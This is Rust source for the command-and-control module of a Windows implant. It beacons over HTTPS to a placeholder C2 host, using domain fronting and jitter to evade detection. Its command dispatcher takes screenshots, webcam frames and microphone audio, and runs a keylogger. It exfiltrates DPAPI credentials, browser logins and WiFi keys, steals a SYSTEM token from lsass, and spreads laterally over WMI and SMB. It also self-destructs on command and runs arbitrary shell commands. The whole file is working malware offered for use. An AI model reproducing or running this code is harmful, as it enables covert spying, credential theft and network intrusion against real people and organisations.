//! c2.rs — HTTPS C2 with domain-fronting support, beacon jitter, and full command dispatch
//!
//! Transport: HTTPS POST via WinHTTP — looks like legitimate TLS traffic.
//! Domain fronting: SNI = front_domain (CDN), Host header = real C2 domain.
//! Beacon jitter: ±30% random variance on sleep interval to defeat timing IOCs.
//!
//! Commands:
//!   screenshot              → desktop BMP
//!   webcam                  → webcam JPEG/BMP
//!   mic <secs>              → WAV audio
//!   download <path>         → pull file from target
//!   upload <path> <size>    → push file to target
//!   keylog start            → install keylogger hook
//!   keylog dump             → drain keylog ring buffer
//!   dpapi dump              → harvest CredMan + browser logins + WiFi PSKs
//!   token escalate          → steal SYSTEM token via lsass impersonation
//!   token revert            → revert thread token
//!   lateral wmi <host> <cmd>       → WMI exec on remote host
//!   lateral smb <host> <bin> <svc> → SMB service exec on remote host
//!   lateral spray <cmd> <bin>      → spray all hosts from last upload
//!   selfdestruct            → wipe + exit
//!   exit                    → clean session close

use std::io::{Read, Write};
use std::time::Duration;
use std::sync::atomic::{AtomicU64, Ordering};

use crate::screenshot;
use crate::webcam;
use crate::mic;
use crate::filetransfer;
use crate::keylog;
use crate::token;
use crate::dpapi;
use crate::lateral;
use crate::selfdestruct;
use crate::SLEEP_KEY;

// ── Build-time C2 config (patched by builder.py) ─────────────────────────────
pub const C2_HOST: &str        = "NGROK_HOST_PLACEHOLDER";  // real C2 domain (Host header)
pub const C2_PORT: u16          = 443;
pub const FRONT_DOMAIN: &str   = "FRONT_DOMAIN_PLACEHOLDER"; // CDN SNI (domain front)
pub const BEACON_INTERVAL_MS: u64 = 15_000;  // 15s base interval
// ─────────────────────────────────────────────────────────────────────────────

// Rolling XOR offset for legacy TCP fallback path (kept for compat)
static XOR_OFFSET: AtomicU64 = AtomicU64::new(0);

// Shared host list for lateral spray
static HOST_LIST: std::sync::OnceLock<std::sync::Mutex<Vec<String>>> = std::sync::OnceLock::new();
fn host_list() -> &'static std::sync::Mutex<Vec<String>> {
    HOST_LIST.get_or_init(|| std::sync::Mutex::new(Vec::new()))
}

// ── Jitter ────────────────────────────────────────────────────────────────────
/// Sleep for `base_ms` ± 30% random jitter (defeats beacon timing analysis)
fn jitter_sleep(base_ms: u64) {
    // PRNG: splitmix64 seeded from system tick count
    let seed = unsafe {
        winapi::um::sysinfoapi::GetTickCount64()
    };
    let z = seed.wrapping_add(0x9e3779b97f4a7c15);
    let z = (z ^ (z >> 30)).wrapping_mul(0xbf58476d1ce4e5b9);
    let z = (z ^ (z >> 27)).wrapping_mul(0x94d049bb133111eb);
    let z = z ^ (z >> 31);
    let jitter_pct = (z % 61) as i64 - 30; // -30% to +30%
    let actual = (base_ms as i64 + (base_ms as i64 * jitter_pct / 100)).max(1000) as u64;
    std::thread::sleep(Duration::from_millis(actual));
}

// ── XOR helpers (legacy / payload fallback) ──────────────────────────────────
fn xor_key() -> &'static [u8] { &SLEEP_KEY }

fn xor_crypt_rolling(data: &[u8]) -> Vec<u8> {
    let key = xor_key();
    if key.is_empty() { return data.to_vec(); }
    let start = XOR_OFFSET.fetch_add(data.len() as u64, Ordering::Relaxed) as usize;
    data.iter().enumerate()
        .map(|(i, b)| b ^ key[(start + i) % key.len()])
        .collect()
}

// ── WinHTTP HTTPS POST ────────────────────────────────────────────────────────
/// POST `body` to `https://<FRONT_DOMAIN>/<path>` with Host: <C2_HOST>
/// Returns response body bytes or None on failure.
unsafe fn https_post(path: &str, body: &[u8]) -> Option<Vec<u8>> {
    use winapi::um::winhttp::*;
    use winapi::shared::minwindef::DWORD;

    let front: Vec<u16> = format!("{}", FRONT_DOMAIN)
        .encode_utf16().chain(std::iter::once(0)).collect();
    let session = WinHttpOpen(
        w("Mozilla/5.0 (Windows NT 10.0; Win64; x64)").as_ptr(),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0,
    );
    if session.is_null() { return None; }

    let connect = WinHttpConnect(session, front.as_ptr(), C2_PORT, 0);
    if connect.is_null() { WinHttpCloseHandle(session); return None; }

    let path_w: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
    let request = WinHttpOpenRequest(
        connect, w("POST").as_ptr(), path_w.as_ptr(),
        std::ptr::null(), WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE,
    );
    if request.is_null() {
        WinHttpCloseHandle(connect); WinHttpCloseHandle(session); return None;
    }

    // Add Host header for domain fronting
    let host_hdr: Vec<u16> = format!("Host: {}\r\n", C2_HOST)
        .encode_utf16().chain(std::iter::once(0)).collect();
    WinHttpAddRequestHeaders(
        request, host_hdr.as_ptr(), host_hdr.len() as DWORD - 1,
        WINHTTP_ADDREQ_FLAG_ADD,
    );
    // Content-Type: application/octet-stream
    let ct: Vec<u16> = "Content-Type: application/octet-stream\r\n"
        .encode_utf16().chain(std::iter::once(0)).collect();
    WinHttpAddRequestHeaders(request, ct.as_ptr(), ct.len() as DWORD - 1, WINHTTP_ADDREQ_FLAG_ADD);

    if WinHttpSendRequest(
        request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        body.as_ptr() as _, body.len() as DWORD, body.len() as DWORD, 0,
    ) == 0 {
        WinHttpCloseHandle(request); WinHttpCloseHandle(connect); WinHttpCloseHandle(session);
        return None;
    }
    if WinHttpReceiveResponse(request, std::ptr::null_mut()) == 0 {
        WinHttpCloseHandle(request); WinHttpCloseHandle(connect); WinHttpCloseHandle(session);
        return None;
    }

    let mut resp = Vec::new();
    loop {
        let mut avail: DWORD = 0;
        WinHttpQueryDataAvailable(request, &mut avail);
        if avail == 0 { break; }
        let mut buf = vec![0u8; avail as usize];
        let mut read: DWORD = 0;
        WinHttpReadData(request, buf.as_mut_ptr() as _, avail, &mut read);
        resp.extend_from_slice(&buf[..read as usize]);
    }
    WinHttpCloseHandle(request); WinHttpCloseHandle(connect); WinHttpCloseHandle(session);
    Some(resp)
}

fn w(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

// ── Beacon loop ───────────────────────────────────────────────────────────────
/// Main C2 loop: beacon every BEACON_INTERVAL_MS ± jitter, dispatch commands.
pub fn callback_and_loop() {
    // Register implant with a beacon ID derived from hostname + username
    let beacon_id = format!("{}-{}", hostname(), username());
    loop {
        let cmd_opt = unsafe {
            let checkin = format!("id={}\n", beacon_id);
            https_post("/beacon", checkin.as_bytes())
                .and_then(|resp| String::from_utf8(resp).ok())
                .map(|s| s.trim().to_string())
                .filter(|s| !s.is_empty())
        };
        if let Some(cmd) = cmd_opt {
            let result = dispatch(&cmd);
            if result == "__EXIT__" { return; }
            if result == "__DESTRUCT__" {
                crate::selfdestruct::destruct();
                return;
            }
            // POST result back
            unsafe {
                let payload = format!("id={}\nresult=\n", beacon_id);
                let mut body = payload.into_bytes();
                body.extend_from_slice(&result.into_bytes());
                https_post("/result", &body);
            }
        }
        jitter_sleep(BEACON_INTERVAL_MS);
    }
}

// ── Command dispatcher ────────────────────────────────────────────────────────
fn dispatch(cmd: &str) -> String {
    let cmd = cmd.trim();

    if cmd.eq_ignore_ascii_case("exit") {
        return "__EXIT__".into();
    }

    if cmd.eq_ignore_ascii_case("selfdestruct") {
        return "__DESTRUCT__".into();
    }

    if cmd.eq_ignore_ascii_case("screenshot") {
        return unsafe {
            match screenshot::capture_screen() {
                Some(bmp) => { post_binary("/data", &bmp); format!("screenshot: {} bytes sent", bmp.len()) }
                None => "ERR:screenshot failed".into(),
            }
        };
    }

    if cmd.eq_ignore_ascii_case("webcam") {
        return match webcam::capture_frame() {
            Some(f) => { unsafe { post_binary("/data", &f); } format!("webcam: {} bytes", f.len()) }
            None => "ERR:no webcam".into(),
        };
    }

    if cmd.starts_with("mic ") {
        let secs: u32 = cmd[4..].trim().parse().unwrap_or(5);
        return match mic::record(secs) {
            Some(wav) => { unsafe { post_binary("/data", &wav); } format!("mic: {} bytes", wav.len()) }
            None => "ERR:mic not available".into(),
        };
    }

    if cmd.eq_ignore_ascii_case("keylog start") {
        keylog::start();
        return "keylog: hook installed".into();
    }

    if cmd.eq_ignore_ascii_case("keylog dump") {
        let buf = keylog::dump();
        unsafe { post_binary("/data", &buf); }
        return format!("keylog: {} bytes exfiltrated", buf.len());
    }

    if cmd.eq_ignore_ascii_case("dpapi dump") {
        let creds = dpapi::dump_all();
        unsafe { post_binary("/data", &creds); }
        return format!("dpapi: {} bytes exfiltrated", creds.len());
    }

    if cmd.eq_ignore_ascii_case("token escalate") {
        return if token::escalate_to_system() {
            "token: escalated to SYSTEM".into()
        } else {
            "token: escalation failed".into()
        };
    }

    if cmd.eq_ignore_ascii_case("token revert") {
        token::revert();
        return "token: reverted".into();
    }

    if cmd.starts_with("lateral wmi ") {
        let rest = &cmd[12..];
        let parts: Vec<&str> = rest.splitn(2, ' ').collect();
        if parts.len() == 2 {
            return match lateral::wmi_exec(parts[0], parts[1]) {
                Ok(o)  => o,
                Err(e) => format!("ERR:{}", e),
            };
        }
        return "ERR:usage: lateral wmi <host> <cmd>".into();
    }

    if cmd.starts_with("lateral smb ") {
        let rest = &cmd[12..];
        let parts: Vec<&str> = rest.splitn(3, ' ').collect();
        if parts.len() == 3 {
            return match lateral::smb_exec(parts[0], parts[1], parts[2]) {
                Ok(o)  => o,
                Err(e) => format!("ERR:{}", e),
            };
        }
        return "ERR:usage: lateral smb <host> <binary_path> <svc_name>".into();
    }

    if cmd.starts_with("lateral spray ") {
        let rest = &cmd[14..];
        let parts: Vec<&str> = rest.splitn(2, ' ').collect();
        if parts.len() == 2 {
            let hosts_lock = host_list().lock().unwrap();
            let hosts: Vec<&str> = hosts_lock.iter().map(|s| s.as_str()).collect();
            let report = lateral::spray(&hosts, parts[0], parts[1]);
            return report;
        }
        return "ERR:usage: lateral spray <cmd> <binary_path>".into();
    }

    if cmd.starts_with("hosts load ") {
        // Load \n-separated host list for lateral spray
        // Operator sends: hosts load <base64-encoded host list>
        let b64 = &cmd[11..];
        if let Some(raw) = crate::dpapi::base64_decode_pub(b64) {
            let hosts = lateral::parse_host_list(&raw);
            let count = hosts.len();
            *host_list().lock().unwrap() = hosts;
            return format!("hosts: loaded {} targets", count);
        }
        return "ERR:invalid base64".into();
    }

    // Shell fallback
    let out = std::process::Command::new("cmd.exe")
        .args(["/C", cmd])
        .output()
        .map(|o| [o.stdout, o.stderr].concat())
        .unwrap_or_else(|e| format!("[err] {}\n", e).into_bytes());
    String::from_utf8_lossy(&out).into_owned()
}

unsafe fn post_binary(path: &str, data: &[u8]) {
    https_post(path, data);
}

fn hostname() -> String { std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".into()) }
fn username()  -> String { std::env::var("USERNAME").unwrap_or_else(|_| "unknown".into()) }
